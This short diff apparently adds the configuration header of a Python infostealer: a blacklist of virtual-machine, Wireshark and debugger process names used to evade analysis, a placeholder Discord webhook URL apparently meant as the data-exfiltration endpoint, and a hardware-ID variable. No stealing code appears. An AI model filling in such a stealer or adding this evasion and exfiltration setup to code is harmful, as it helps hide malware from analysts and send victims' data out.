@@ -1,0 +1,4 @@
+bl = ["vboxservice.exe","vboxtray.exe","vmtoolsd.exe","vmwaretray.exe","vmwareuser.exe","wireshark.exe","x64dbg.exe","ollydbg.exe"]
+hook = "https://discord.com/api/webhooks/1/x"
+hw = "HWID"
+
